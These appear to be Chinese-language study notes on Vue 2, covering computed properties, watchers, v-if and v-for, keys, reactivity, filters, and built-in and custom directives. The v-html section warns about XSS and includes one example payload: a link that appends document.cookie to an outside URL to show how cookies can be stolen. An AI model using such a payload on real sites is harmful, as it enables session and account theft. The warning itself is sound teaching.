    - 你可能要问, 为什么是 `y` 而不是 `Y` 呢? 我验证了一下, 大小写都可以, 无论是使用两个按键修饰符, 还是一个按键修饰符, 大小写都可以触发事件. 但是, 按键事件中, 大写就是大写, 小写就是小写
      - ![](../image/Snipaste_2021-11-21_10-36-06.png)
## 计算属性(computed)
1. 官网说的很清楚, 设计计算属性的目的是`简便模板内表达式运算`. 模板内应该是简单的声明式逻辑, 而太多的咯及使得模板过重难以维护
    - ```js
       {{ message.split('').reverse().join('') }}
    - 对于任何复杂逻辑, 你都应当使用计算属性.
    - 计算属性要通过已有的 **`属性`** 计算
2. 全新的配置项 `computed`
    - ```js
      new Vue({
        data: {
          firstname: '',
          lastname: ''
        },
        computed: {
          fullname1: {
            get() {
              return this.firstname + '-' + this.lastname;
            },
            set(value) {
              console.log('set', value);
            }
          }
        },
      })
    - ```html
      <div id="root">
        firname: <input type="text" name="firstname" v-model:value="firstname"> <br>
        lastname: <input type="text" name="lastname" v-model:value="lastname"> <br>
        fullname1: <h4>{{fullname1}}</h4>
      </div>
    - 计算属性最终出现在 vm 上, 直接读取使用即可.
      - ![](../image/Snipaste_2021-11-23_22-42-43.png)
    - 如果计算属性要被修改, 就必须写 `setter` 响应修改. 且 `setter` 中要引起计算属性依赖的数据发生变化
3. `getter` 方法可以接收参数 `vm`
    - ```js
      fullname1: {
        get(a, b) {
          console.log('getter param', a, b); // vm, undefined
          console.log('getter this', this);
          return this.firstname + '-' + this.lastname;
        },
        set(value) {
          console.log('set', value);
        }
      }
    - ![](../image/Snipaste_2021-11-23_22-50-15.png)
    - 不过, `getter` 方法中的 `this` 就是 `vm`, 所以...这个参数😅尴尬
4. 简写形式
    - ```js
      computed: {
        fullname() {
          return this.firstname + '-' + this.lastname;
        }
      }
    - 因为计算属性更多只读, 所以使用简写形式, 就相当于 `getter`
    - 虽然简写看起来很想方法, 但是如果你在模板使用下面的代码, 则会报错
      - ```html
        fullname(): <h4>{{fullname()}}</h4>
      - ![](../image/Snipaste_2021-11-25_21-35-12.png)
5. 计算属性的缓存
    - 如果我们在 methods 定义新的方法同样可以达到计算属性的效果, 比如
      - ```js
        methods: {
          fullnameMethods() {
            return this.firstname + '-' + this.lastname;
          }
        },
    - 但是 **`计算属性是基于他们的响应式依赖进行缓存的`**, 只在依赖的数据发生变化时, 计算属性才会重新求值; 否则计算属性会立刻返回之前的计算结果, 而不必再次执行函数.
      - 我们在计算属性中打印一些数据, 然后在模板中多次调用该属性. 结果只会打印一次哦~😮
      - ```js
        fullname() {
          console.log('@@@@');
          return this.firstname + '-' + this.lastname;
        },
      - ```html
        fullname: <h4>{{fullname}}</h4>
        fullname: <h4>{{fullname}}</h4>
        fullname: <h4>{{fullname}}</h4>
        fullname: <h4>{{fullname}}</h4>
        fullname: <h4>{{fullname}}</h4>
      - ![](../image/Snipaste_2021-11-25_21-41-23.png)
## 监视属性(watch)
1. 顾名思义, 该属性用来监听数据的变化. 当需要在数据变化时执行异步或开销较大的操作时, 这个方式很有用. 构造 `Vue` 实例时需要传入全新的配置项 `watch`
2. 如下案例, 监视 `isHot` 的变换, 页面动态展示天气
    - ```html
      <h4>今天天气很{{isHot ? '炎热' : '凉爽'}}</h4>
      <button @click="isHot = !isHot">改变天气</button>
    - ```js
      new Vue({
        el: '#root',
        data: {
          isHot: true
        },
        watch: {
          isHot: {
            handler(newValue, oldValue) {
              console.log('isHot changed, ', newValue, oldValue);
            }
          }
        },
      })
    - 需要监视哪个属性, 就在 `watch` 中用该属性作为 `key`. `value` 是一个对象, 其中可以写一个函数, 该函数在被监视的属性变化时调用. 这个函数接收两个参数, 分别是被监视属性的`新值`和`旧值`.
3. 监视计算属性
    - 因为计算属性也是属性, 所以也可以监视计算属性哦~
    - ```js
      computed: {
        weather() {
          return this.isHot ? '炎热' : '凉爽';
        }
      },
      watch: {
        weather: {
          handler(newValue, oldValue) {
            console.log('计算属性修改了:', newValue, oldValue);
          }
        },
      },
    - ![](../image/Snipaste_2021-11-27_08-45-54.png)
4. 其他配置项 `immediate`
    - 在上面的监视中, 只有被监视属性被修改了, 才会调用回调, 如果我想在被监视属性初始化时就进行监视, 需要使用`watch` 全新配置项 `immediate`
    - ```js
      isHot: {
        immediate: true,
        handler(newValue, oldValue) {
          console.log('isHot changed, ', newValue, oldValue);
        }
      },
    - ![](../image/Snipaste_2021-11-27_08-53-47.png)
    - 刚初始化, 所以 `oldValue` 为 `undefined`
    - 有了这个配置项, 我们可以研究一件事, 如果监听一个不存在的属性, `Vue` 会怎么做呢?
      - ```js
        watch: {
          haha: {
            immediate: true,
            handler(newValue, oldValue) {
              console.log('haha changed, ', newValue, oldValue);
            }
          }
        },
      - ![](../image/Snipaste_2021-11-27_08-58-04.png)
      - 对于不存在的属性, 新旧值都为 `undefined`
5. 其他配置项 `deep`(深度监视)
    - 我们有一个新的数据项, 如果我们想监视 `user` 中的 `age` 怎么办?
      - ```js
        data: {
          isHot: true,
          user: {
            name: 'wang',
            age: 18
          }
        },
      - ```html
        <h4>年龄为:{{user.age}}</h4>
        <button @click="user.age++">改变user.age</button>
      - ```js
        'user.age': {
          handler(newValue, oldValue) {
            console.log('user.age changed, ', newValue, oldValue);
          }
        }
      - 其实定义对象的时候, `key` 也是字符串, 但我们通常都不给 `key` 加字符串, 这个时候就派上用场了.
    - 如果我想监视 `user` 里 `age` 和 `name` 的变化呢? 其实可以分别监视 `age` 和 `name`, 但是就要写两边.
      - 下面的写法, 不会生效. 因为老师说, 因为 `Vue` 监视的是地址, 如果我们只`变更`而不是`替换` `user`, 比如 `user` 的 `age` 加 `1`, 那么 `user` 的地址没有改变.
      - ```js
        user: {
          handler(newValue, oldValue) {
            console.log('user changed, ', newValue, oldValue);
          }
        }
      - 如果想让上面的监视起作用, 就需要 `替换`
      - ```html
        <button @click="user = { name: 'wu', age: 19 }">整体替换user</button>
      - ![](../image/Snipaste_2021-11-27_09-17-42.png)
    - 如果我们只想写一个监视, 但要监视被监视属性所有内部层级变化, 使用 `deep`
      - ```js
        user: {
          deep: true,
          handler(newValue, oldValue) {
            console.log('user changed, ', newValue, oldValue);
          }
        }
6. 监视的简写
    - 如果我们只关心值的修改, 不关心深度监视和初始化监视, 就可以使用简写形式. 
    - ```js
      isHot(newValue, oldValue) {
        console.log('isHot changed, ', newValue, oldValue);
      },
7. `$watch`
    - 除了在创建 `Vue` 实例时配置监视属性, 还可以手动调用 `vm` 方法监视
    - ```js
      vm.$watch('user.name', {
        immediate: true,
        handler(newValue, oldValue) {
          console.log('user.name changed:', newValue, oldValue);
        }
      });
    - 简写形式. 📕注意: 简写时要用普通函数, 不要用箭头函数, 避免函数中 `this` 的改变
    - ```js
      vm.$watch('user.name', function (newValue, oldValue) {
        console.log('user.name changed:', newValue, oldValue);
      });
### 计算属性 VS 监视属性
1. 以官网的 `fullname` 的例子
    - 计算属性
      - ```js
        var vm = new Vue({
          el: '#demo',
          data: {
            firstName: 'Foo',
            lastName: 'Bar'
          },
          computed: {
            fullName: function () {
              return this.firstName + ' ' + this.lastName
            }
          }
        })
    - 监视属性
      - ```js
        var vm = new Vue({
          el: '#demo',
          data: {
            firstName: 'Foo',
            lastName: 'Bar',
            fullName: 'Foo Bar'
          },
          watch: {
            firstName: function (val) {
              this.fullName = val + ' ' + this.lastName
            },
            lastName: function (val) {
              this.fullName = this.firstName + ' ' + val
            }
          }
        })
    - 从上面的例子看, 依赖的属性越多, 计算属性相对于监视属性的优势就更大, 因为依赖多少个属性, 就要写几个 `watch` 项
    - 但是, 如果我们修改 `firstName` 后, 想要 1s 之后再使数据发生变化, 此时计算属性就没法达到了, 只能使用监听属性, 因为计算属性是依赖返回值的.
## 条件渲染
1. `v-show`
    - 会根据指令表达式返回 truthy 时显示, 否则隐藏.
    - ```html
      <h4 v-show="true">哈哈哈(*^_^*)</h4>
      <h4 v-show="isShow">哈哈哈(*^_^*)</h4>
      ```
      - 📕注意: 我们没有用 `v-bind` 绑定哦!
    - ```js
      data: {
        sum: 0,
        isShow: false
      }
    - ![](../image/Snipaste_2021-11-28_10-19-20.png)
    - `v-show` 的元素始终会被渲染并保留在 DOM 中, `v-show` 只是简单切换元素的 `CSS` `display` 属性
    - 📕注意: `v-show` 不支持 `<template>`
2. `v-if`
    - 同样会根据指令表达式返回 truthy 时显示, 否则隐藏.
    - ```html
      <h4 v-if="true">呵呵呵(*^_^*)</h4>
      <h4 v-if="isShow">呵呵呵(*^_^*)</h4>
    - ![](../image/Snipaste_2021-11-28_10-31-27.png)
    - 看到撒, `v-if` 为 `false` 的元素根本没有出现在 `DOM`, 是真正的条件渲染. 正因为如此, `v-if` 有更高的切换开销, 如果需要频繁切换, 使用 `v-show` 更好.
3. `v-else`
    - `v-else` 用来表示 `v-if` 的 `else` 语句
    - ```html
      <h4 v-if="isShow">嘻嘻嘻if(*^_^*)</h4>
      <h4 v-else>嘻嘻嘻else(*^_^*)</h4>
    - ![](../image/Snipaste_2021-11-28_19-53-02.png)
    - 其实, 这时候 `v-else` 后面即使加上 `truthy` 表达式亦无济于事
      - ```html
        <h4 v-if="isShow">嘻嘻嘻if(*^_^*)</h4>
        <h4 v-else="isShow">嘻嘻嘻else(*^_^*)</h4>
      - `isShow` 本身为 `false`, 即便如此, 但是 `else` 后面的值被忽略了
    - `v-if` 和 `v-else` 之间不能被打断
      - ```html
        <h4 v-if="isShow">不能被打断哦~(*^_^*)</h4>
        <div>hhh</div>
        <h4 v-else>不能被打断哦~(*^_^*)</h4>
      - 来解释一下会发生什么, 首先因为 `isShow` 为 `false`, 所以第一个 `h4` 不会显示. 然后 `div` 打断了两个 `h4` 然后第二个 `h4` 也不会显示
      - ![](../image/Snipaste_2021-11-28_20-08-06.png)
      - 报错啦😅
      - ![](../image/Snipaste_2021-11-28_20-13-07.png)
4. `v-else-if`
    - `v-else-if` 就是 `v-if` 的 `else if` 语句
      - ```html
        <h4 v-if="type === 'A'">A</h4>
        <h4 v-else-if="type === 'B'">A</h4>
        <h4 v-else>undefined</h4>
      - ```js
        data: {
          type: 'B'
        }
      - ![](../image/Snipaste_2021-11-28_20-22-29.png)
    - `v-else-if` 也必须紧跟在带 `v-if` 或 `v-else-if` 的元素之后
      - ```html
        <h4 v-if="type === 'A'">A</h4>
        <div>@</div>
        <h4 v-else-if="type === 'B'">B</h4>
        <h4 v-else>undefined</h4>
      - 最终显示的只有 `@`, 而且控制台报错.
5. `<template>`
    - 如果我们项使用 `v-if` 或者 `v-show` 同时隐藏显示多个于元素, 第一想法是用一个 `div` 包括这些元素, 然后将 `v-if` 或者 `v-show` 作用在这个元素上.
      - ```html
        <div v-show="isShow">
          <h4>我</h4>
          <h4>是</h4>
          <h4>wang</h4>
        </div>
    - 这样做的弊处, 就是页面多了一个元素. 为了解决这个问题, 可以使用 `<template>`
      - ```html
        <template v-if="isShow">
          <h4>我</h4>
          <h4>是</h4>
          <h4>wang</h4>
        </template>
      - 📕值得注意: `template` 只能配合 `v-if` 使用, 因为 `v-show` 通过 `display` 控制显示与否, 而 `template` 本身并不存在
## 列表渲染(v-for)
1. `v-for` 指令基于一个数组渲染一个列表. 这个指令需要使用`item in items` 形式的特殊语法, 其中 `items` 是源数据数组, `item` 是被迭代数组元素的`别名`.
    - ```html
      <ul>
        <li v-for="user in userList">
          {{user.name}} is {{user.age}} year(s) old.
        </li>
      </ul>
    - ```js
      data: {
        userList: [
          { id: '001', name: 'zhangsan', age: 18 }, 
          { id: '002', name: 'lisi', age: 19 },
          { id: '003', name: 'wangwu', age: 20 },
        ]
      }
    - ![](../image/Snipaste_2021-11-29_21-58-41.png)
    - 在 `v-for` 中, 我们可以使用父级作用域的数据,
      - ```html
        <ul>
          <li v-for="user in userList" :key="user.id">
            {{greeting}}, {{user.name}} is {{user.age}} year(s) old.
          </li>
        </ul>
      - ```js
        data: {
          greeting: 'hello', 
          userList: [
            { id: '001', name: 'zhangsan', age: 18 }, 
            { id: '002', name: 'lisi', age: 19 },
            { id: '003', name: 'wangwu', age: 20 },
          ]
        }
      - ![](../image/Snipaste_2021-11-29_22-02-17.png)
2. 少了`key`
    - 在上面的模板中, 少了关键的特殊 `attribute`: [key](https://cn.vuejs.org/v2/api/#key)
    - 主要用在 `Vue` 的虚拟 `DOM` 算法，在新旧 `nodes` 对比时辨识 `VNodes`. 最常见的用例是结合 `v-for`
    - ```html
      <ul>
        <li v-for="user in userList" :key="user.id">
          {{user.name}} is {{user.age}} year(s) old.
        </li>
      </ul>
3. 第二个可选参数 `index`
    - `index`: 当前项的索引
    - ```html
      <ul>
        <li v-for="(user, index) in userList" :key="user.id">
          {{user.name}} is {{user.age}} year(s) old. --- {{index}}
        </li>
      </ul>
    - ![](../image/Snipaste_2021-11-29_22-00-24.png)
    - 其中指令中的括号可以不写, 直接`v-for="user,index in userList" `. 但是老师不推荐.
      - ```html
        <li v-for="user,index in userList" :key="user.id">
          {{user.name}} is {{user.age}} year(s) old. --- {{index}}
        </li>
    - 可以使用 `of` 替换 `in`, 一般用 `in`
      - ```html
        <li v-for="(user,index) of userList" :key="user.id">
          {{user.name}} is {{user.age}} year(s) old. --- {{index}}
        </li>
4. 使用 `v-for` 遍历对象
    - ```html
      <li v-for="(value,key,index) of car" :key="key">
        {{value}}---{{key}}--{{index}}
      </li>
    - ```js
      data: {
        car: {
          name: 'Model Y',
          price: '30W',
          color: 'Black'
        }
      }
    - 📕注意: 先是 `value`, 后是 `key`
    - ![](../image/Snipaste_2021-11-30_19-36-51.png)
5. 使用 `v-for` 遍历字符串
    - ```html
      <li v-for="(char,index) of greeting" :key="key">
        {{char}}---{{index}}
      </li>
    - ![](../image/Snipaste_2021-11-30_19-32-56.png)
6. 使用 `v-for` 遍历指定次数
    - ```html
      <li v-for="(number,index) of 5" :key="key">
        {{number}}---{{index}}
      </li>
    - ![](../image/Snipaste_2021-11-30_19-34-14.png)
### 特殊的 key
1. 先看一下下面的代码, 就是点击按钮在队首添加用户
    - ```html
      <button @click="addUser">点击添加用户</button>
      <ul>
        <li v-for="(user,index) in userList" :key="index">
          {{user.name}}--{{user.age}}
          <input type="text">
        </li>
      </ul>
    - ```js
      data: {
        userList: [
          { id: '001', name: 'zhan', age: 18 }, 
          { id: '002', name: 'lisi', age: 19 },
          { id: '003', name: 'wang', age: 20 },
        ]
      },
      methods: {
        addUser() {
          const user = { id: '004', name: 'zhou', age: 21 };
          this.userList.unshift(user);
        }
      }
    - 刚开始效果, 在输入框中复制其前面的元素
    - ![](../image/Snipaste_2021-11-30_21-18-55.png)
    - 点击按钮之后, 当当当~🔥 问题是输入框的内容并没有随之移动
    - ![](../image/Snipaste_2021-11-30_21-19-33.png)
2. 使用 `index` 作为 `key`
    - ![](../image/Snipaste_2021-11-30_21-20-46.png)
    - 输入框中输入的数据在真实 `DOM`, 在对比虚拟 `DOM` 时, 尽管 `张三--18` 和 `老刘--40` 不同, 但是后面的 `<input>` 标签却被当作相同.
    - 即便后面没有输入类的 `input`, 但是已有的数据在更新后是重新生成的, 而不是复用, 导致效率较低
3. 使用 `id` 作为 `key`
    - ![](../image/Snipaste_2021-11-30_21-39-30.png)
4. 不适用 `key` 属性
    - 默认 `key` 就是 `index`. 😀
### 数组更新检测
1. 列表过滤
    - 输入字符, 寻找对应姓名的人
    - ```html
      <div id="root">
        <h3>人员列表</h3>
        <input type="text" name="name" v-model="keyword" placeholder="请输入人员姓名">
        <ul>
          <li v-for="user in filteredUserList">
            {{user.id}} --- {{user.name}} -- {{user.age}}
          </li>
        </ul>
      </div>
    - ```js
      data: {
        keyword: '',
        userList: [
          { id: '001', name: 'zhangsan', age: 18 },
          { id: '002', name: 'lisi', age: 19 },
          { id: '003', name: 'wangwu', age: 20 },
        ],
        filteredUserList: []
      },
      watch: {
        keyword: {
          immediate: true,
          handler(newValue, oldValue) {
            this.filteredUserList = this.userList.filter(user => {
              return user.name.indexOf(newValue) !== -1
            });
          }
        }
      },
    - `filter()` 方法本身并不改变原数组, 而是返回过滤后的新数组. 
2. 数组排序
    - 还是上面的案例, 但是加上排序方法
    - ```html
      <button @click="sortType = 1">升序</button>
      <button @click="sortType = 2">降序</button>
      <button @click="sortType = 0">原序</button>
    - ```js
      watch: {
        sortType(newValue) {
          if (newValue) {
            this.filteredUserList.sort((user1, user2) => {
              return this.sortType === 1 ? user1.age - user2.age : user2.age - user1.age;
            })
          }
        }
      }
    - `sort()` 改变原数组
4. 更新时的一个问题
    - 如果我们更新一个用户信息, 下面这样写是奏效的
    - ```html
      <button @click="updateWangWork">更新wang奏效</button>
      <button @click="updateWangNotWork">更新wang不奏效</button>
    - ```js
      methods: {
        updateWangWork() {
          this.userList[2].age = 21;
          this.userList[2].name = 'wangliu';
        }
      }
    - 📕但是, 下面没有奏效
    - ```js
      methods: {
        updateWangNotWork() {
          this.userList[2] = { id: '003', name: 'wangliu', age: 21 }
        } 
      }
    - ![](../image/Snipaste_2021-12-04_09-03-13.png)
    - 此时开发者工具中的数据也没有修改, 但是如果你先点击按钮, 再打开开发者工具中的 `Vue DevTools` 数据就改变了, 取决于点击和打开的顺序

### 穿插数据劫持
1. 我们可以先写一个自己觉得正确的数据劫持
    - 
    - ```js
      let data = {
        name: 'wang'
      };

      Object.defineProperty(data, 'name', {
        get() {
          return data.name;
        },
        set(value) {
          data.name = value;
        }
      });
    - 当我们读取或者修改 `name` 时就会发生最大栈调用的问题. 
    - ![](../image/Snipaste_2021-12-04_09-56-41.png)
    - 为什么呢? 以读取为例, 当调用 `get` 方法时, 返回的 `data.name` 实际上再次调用了 `get`, 这是无限的递归调用. `set` 同理
    - ![](../image/Snipaste_2021-12-04_09-58-45.png)
2. `Vue` 如何检测数据的改变呢? `Object.defineProperty()`  
    - 分两步(大概这么个意思😅)
      - 获取被劫持对象的所有属性
      - 遍历这些属性, 并使用 `Object.defineProperty` 将这些 `property` 全部转换为 `getter/setter`
    - ```js
      let user = {
        name: 'wang',
        address: 'China'
      };

      function Observer(obj) {
        const keys = Object.keys(obj);
        keys.forEach((key) => {
          Object.defineProperty(this, key, {
            get() {
              return obj[key];
            },
            set(value) {
              // 这里同时更新模板...
              obj[key] = value;
            }
          })
        })
      }

      let obs = new Observer(user);
      vm._data = obs;
    - ![](../image/Snipaste_2021-12-04_10-13-22.png)
    - 我们这里的数据只有一层属性, `Vue` 所做的更强大, 数组中的对象, 对象中的对象, 一层一层都可以监视到
### Vue.set()/vm.$set
1. 给对象增加响应式数据
    - 如果我们想给一个对象运行期间增加一个属性, 直接`.propName` 的方法是行不通的, 因为该属性不是响应式的, 没有生成对应的 `getter/setter`
    - ```html
      <div id="root">
        <h4>姓名:{{student.name}}</h4>
        <h4>年龄:{{student.age}} </h4>
        <h4>地址:{{student.address}}</h4>
        <div>
          <button @click="addAddress">添加地址</button>
        </div>
      </div>
    - ```js
      data: {
        student: {
          name: 'wang',
          age: 18
        }
      },
      methods: {
        addAddress() {
          // 尝试动态增加属性
          this.student.addAddress = 'beijing';
        }
      }
    - ![](../image/Snipaste_2021-12-05_10-11-28.png)
- `Vue.set()`
    - 要给对象增加响应式数据, 只能通过这个 `api`
    - `Vue.set(target, propertyName, value)`
    - ```js
      methods: {
        addAddress() {
          Vue.set(this.student, 'address', 'beijing');
        }
      }
    - ![](../image/Snipaste_2021-12-05_10-15-46.png)
    - 其还有个同等的 `api`, `vm.$set()`, 使用方法相同
    - 📕注意: `target` 不能是 `Vue` 实例或者 `Vue` 实例的根数据对象
      - ```js
        methods: {
          addAddress() {
            Vue.set(this, 'bilibili', '999');
          }
        }
      - ![](../image/Snipaste_2021-12-05_10-27-54.png)
      - 报错说的很明白, 如果你想这么做, 这能在 `data` 配置项里添加, 运行期间不可以🙅‍🙅‍🙅‍
### Vue 如何检测数组更新
1. 我们先增加一个学生爱好的属性, 然后点击之后修改第一个爱好
    - ```html
      <div id="root">
        <h4>姓名:{{student.name}}</h4>
        <h4>年龄:{{student.age}}</h4>
        <h4>爱好:{{student.hobbies}}</h4>
        <button @click="updateHobby">修改第一个爱好为"看电影"</button>
      </div>
    - ```js
      data: {
        student: {
          name: 'wang',
          age: 18,
          hobbies: ['吃饭', '睡觉', '听音乐']
        }
      },
      methods: {
        updateHobby() {
          console.log('updateHobby---');
          this.student.hobbies[0] = '看电影';
        }
      }
    - ![](../image/Snipaste_2021-12-06_16-23-31.png)
2. 为什么没有生效呢?
    - `Vue` 认为, 如果要认定数组发生了修改, 那么就是调用了数组的某些方法. `Vue` 将被侦听的数组的变更方法做了包装, 所以调用这些方法将会触发视图更新. 这些被包裹的方法包括
      - `push()`
      - `pop()`
      - `shift()`
      - `unshift()`
      - `splice()`
      - `sort()`
      - `reverse()`
    - ![](../image/Snipaste_2021-12-06_16-36-06.png)
    - ```js
      updateHobby() {
        console.log('updateHobby---');
        this.student.hobbies.splice(0, 1, '看电影');
      }
    - 如果我们打印一下数组, 其实不像一般数据有 `getter/setter`
      - ![](../image/Snipaste_2021-12-06_17-45-41.png)
    - 但是, 如果数组中的数据不是基本数据类型, 而是对象, 那么 `Vue` 仍然会为每个对象属性增加 `getter/setter`, 这时我们使用 `[index].propName` 的形式操作属性是可以生效的
      - ```js
        student: {
          name: 'wang',
          age: 18,
          hobbies: ['吃饭', '睡觉', '听音乐'],
          friends: [
            { name: 'li', age: 18 },
            { name: 'wu', age: 18 }
          ]
        }
      - ```js
        // work
        updateFirstFriendAge() {
          this.student.friends[0].age = 20;
        }
    - 对于数组的剩下方法, 并不会变更原数组, 只会返回一个新数组. 如果使用非变更方法, 可以用新数组替换旧数组
      - `filter()`
      - `concat()`
      - `slice()`
3. 因为数组也是对象, 而且所谓的`属性名`是索引, 所以修改的时候也可以这样写
    - ```js
      updateHobby() {
        console.log('updateHobby---');
        Vue.set(this.student.hobbies, 0, '看电影');
      }
### 过滤器(filter)
1. 自定义过滤器，可被用于一些常见的文本格式化
    - 过滤器可以用在两个地方: `双花括号插值` 和 `v-bind 表达式`
    - 过滤器应该被添加在 `JavaScript` 表达式的尾部, 由“`管道`”符号指示
    - 📕本质: `函数`
2. 新的配置项 `filter`
    - 我们做一个格式化时间的案例
    - ```html
      <div id="root">
        <h2>显示格式化后的时间戳</h2>
        <h3>现在是: {{time | timeFormatter}}</h3>
      </div>
    - ```js
      new Vue({
        el: '#root',
        data: {
          time: Date.now()
        },
        filters: {
          timeFormatter(time) {
            return dayjs(time).format('YYYY-MM-DD HH:mm:ss')
          }
        }
      })
    - ![](../image/Snipaste_2021-12-07_19-31-42.png)
3. 传递参数
    - 过滤器函数总接收表达式的值作为第一个参数. 例如, 修改上述案例, 使之自由定制格式化内容
    - ```html
      <div id="root">
        <h2>显示格式化后的时间戳</h2>
        <h3>现在是: {{time | timeFormatter}}</h3>
        <h3>现在是: {{time | timeFormatter('YYYY-MM-DD')}}</h3>
      </div>
    - ```js
      filters: {
        timeFormatter(time, formatter) {
          formatter = formatter || 'YYYY-MM-DD HH:mm:ss'
          return dayjs(time).format(formatter);
        }
      }
4. 多个过滤器串联
    - 第一个过滤器返回的结果会作为第二个过滤器的参数
    - ```html
      <div id="root">
        <h3>现在是: {{time | timeFormatter('YYYY-MM-DD') | mySlice}}</h3>
      </div>
    - ```js
      filters: {
        mySlice(str) {
          return str.substring(0, 4);
        }
      }
5. 全局过滤器
    - `Vue.filter( id, [definition] )`: 注册或获取全局过滤器
    - ```html
        <h3>现在是: {{time | timeFormatter('YYYY-MM-DD') | mySlice | plusYear}}</h3>
    - ```js
      Vue.filter('plusYear', function(year) {
        return parseInt(year) + 1;
      });
      new Vue({...})
    - 📕注意: 必须在创建 `vm` 之前调用创建全局过滤器方法
    - 如果只传 `id`, 那么就是获取该过滤器
      - ![](../image/Snipaste_2021-12-07_19-50-23.png)
    - 当全局过滤器和局部过滤器重名时，会采用局部过滤器
6. `v-bind` 使用过滤器
    - ```html
      <div :id="id | mySlice"></div>
    - ```js
      data: {
        id: 'box111',
      },
      filters: {
        mySlice(str) {
          return str.substring(0, 4);
        }
      }
7. 😟 `Vue3` 取消了过滤器
## 内置指令
### v-text
1. 更新元素的 `textContent`
    - ```html
      <div id="root">
        <div>{{name}}</div>
        <div v-text="name"></div>
        <div v-text="name" id="bili">wu</div>
        <div v-text="str"></div>
      </div>
    - ```js
      data: {
        name: 'wang',
        str: '<h1>hello</h1>'
      }
    - ![](../image/Snipaste_2021-12-08_22-51-41.png)
2. 📕注意
    - 使用 `v-text` 会完全替换节点内容, 尽管节点中可能有数据. 如果只想部分更新节点内容, 使用 `mustache` 语法: `{{}}`
    - `v-text` 只会渲染文本内容, 不会解析 `HTML` 标签
### v-html
1. 更新元素的 `innerHTML`
    - 内容按照普通 `HTML` 插入, 不会作为 `Vue` 模板编译
    - ```html
      <div v-html="str"></div>
    - ```js
      data: {
        str: '<h1>hello</h1>'
      },
    - ![](../image/Snipaste_2021-12-09_21-45-41.png)
2. 📕注意: 在网站上动态渲染任意 HTML 是非常危险的, 因为容易导致 XSS 攻击. **只在**可信任的内容上使用 `v-html`, **永不**用在在用户提交内容上
    - 下面看一个例子
    - 我们先在网站上加上两个 `cookie`
    - ![](../image/Snipaste_2021-12-09_21-56-15.png)
    - 然后在页面增加代码
    - ```html
      <div v-html="url"></div>
    - ```js
      data: {
        url: `<a href="https://www.baidu.com?${document.cookie}">点我立刻到账$1000</>`
      }
    - ![](../image/Snipaste_2021-12-09_22-05-33.png)
    - 点击链接之后
    - ![](../image/Snipaste_2021-12-09_22-05-55.png)
    - 如果你登陆的是银行的网站, 那么一旦你点击了非法链接, 对方就会获取你的 `cookie`, 进而掌握你的账户信息等.
### v-clock
> cloak: 斗篷; (尤指旧时的)披风; 遮盖物;
1. 如果外部的 `js` 文件加载耗时太长(比如我手动设置 `3s` 后返回), 并且将 `js` 加载放在 `HTML` 文件底部
    - ```js
      app.get('/vue.js', (req, res) => {
      console.log('sendfile absolute path.');
      let options = {
        root: path.join(__dirname, '../resource')
      };
      setTimeout(() => {
        res.sendFile('vue.min.js', options);
      }, 3000);
    });
    - ```html
      <div id="root">
        {{name}}
      </div>
      <script src="http://localhost:3000/vue.js"></script
    - 就会出现下面的效果: 加载过程中, 页面上的模板语法原封不动的展示了出来😅
    - ![](../image/Snipaste_2021-12-11_09-11-24.png)
2. 这个指令保持在元素上直到关联实例结束编译. 
    - 和 `CSS` 规则如 `[v-cloak] { display: none }` 一起用时, 这个指令可以隐藏未编译的 `Mustache` 标签直到实例准备完毕
    - 这个指令没有值
    - ```html
      <div id="root">
        <h2 v-cloak>{{name}}</h2>
      </div>
    - ![](../image/Snipaste_2021-12-11_09-19-36.png)
    - `Vue` 会在实例编译结束前, 加上 `v-cloak`; 编译结束后, 去除 `v-cloak`. 配合下面的 `CSS` 使用可以隐藏未编译的模板语法
    - ```css
      <style>
        [v-cloak] {
          display: none;
        }
      </style>
    - ![](../image/Snipaste_2021-12-11_09-23-11.png)
### v-once
1. 只渲染元素和组件一次. 随后的重新渲染, 元素/组件及其所有的子节点将被视为静态内容并跳过. 这可以用于优化更新性能. 
2. 需求: 展示初始值和后面之后的递增值
    - ```html
      <div id="root">
        <h2 v-once>初始值: {{sum}}</h2>
        <h2>递增之后: {{sum}}</h2>
        <button @click="sum++">点我+1</button>
      </div>
    - ```js
      data: {
        sum: 0
      }
    - ![](../image/Snipaste_2021-12-11_09-32-30.png)
### v-pre
1. 跳过这个元素和它的子元素的编译过程. 可以用来显示原始 `Mustache` 标签. 跳过大量没有指令的节点会加快编译.
2. 不需要表达式
    - ```html
      <div id="root">
        <h2 v-pre>这是一个案例</h2>
        <h2 v-once>初始值: {{sum}}</h2>
        <h2>递增之后: {{sum}}</h2>
        <button v-pre a="1"  @click="sum++">点我+1</button>
      </div>
    - ![](../image/Snipaste_2021-12-11_09-42-02.png)
## 自定义指令
### 函数式
1. 一个需求: 借助自定义指令实现数字 10 倍放大.
    - ```html
      <div id="root">
        <h2>原始值是: {{sum}}</h2>
        <h2>十倍之后是</h2>
        <h2 v-multiply10="sum"></h2>
        <button @click="sum++">点我+1</button>
      </div>
    - 如果只是这样呈现, 就会报错, 因为找不到指令 `multiply10`
    - ![](../image/Snipaste_2021-12-11_10-11-33.png)
3. 使用全新配置项 `directives`
    - ```js
      new Vue({
        el: '#root',
        data: {
          sum: 1
        },
        directives: {
          multiply10(element, binding) {
            console.log(element, binding);
          }
        }
      })
    - 先来看看这两个参数都是什么意思
    - ![](../image/Snipaste_2021-12-11_10-13-59.png)
    - `element`: 指令所绑定的元素,可以直接操作 `DOM`
    - `binding`: 一个对象, 包含一下属性
      - `name`: 指令名, 不包括 `v-` 前缀
      - `value`: 指令的绑定值. 因为 `sum` 的默认值是 `1`, 所以 `value` 就是 `1`. 如果我们绑定的是 `sum+1`, 那 `value` 就是 `2`
      - `expression`: 字符串形式的指令表达式
      - `modifiers`: 一个包含修饰符的对象. 如果 `v-multiply10.foo.bar` 中, 修饰符对象为 `{ foo: true, bar: true }`
    - 📕注意: 因为我们要操作 `DOM`, 所以模板中使用自定义指令的标签究竟显示什么, 并不依赖函数的返回值
    - ```js
      directives: {
        multiply10(element, binding) {
          element.innerHTML = binding.value * 10;
        }
      }
    - ![](../image/Snipaste_2021-12-11_10-19-49.png)
3. 自定义指令何时被调用?
    - 指令与元素成功`绑定`时(一上来)
    - 指令所在的模板被重新解析时. 📕这里不是指令依赖的数据发生改变时哦!!!
### 对象式
1. 需求: 定义 `v-fbind` 指令, 类似 `v-bind` 功能, 但可以让其所绑定的 `input` 元素默认获取焦点
    - ```html
      <div id="root">
        <button @click="name += '~'">改变名字哦</button> <br/>
        <label for="username">姓名: </label>
        <input type="text" name="username" id="username" v-fbind="name">
      </div>
    - ```js
      directives: {
        fbind(element, binding) {
          element.focus();
          element.value = binding.value;
        }
      }
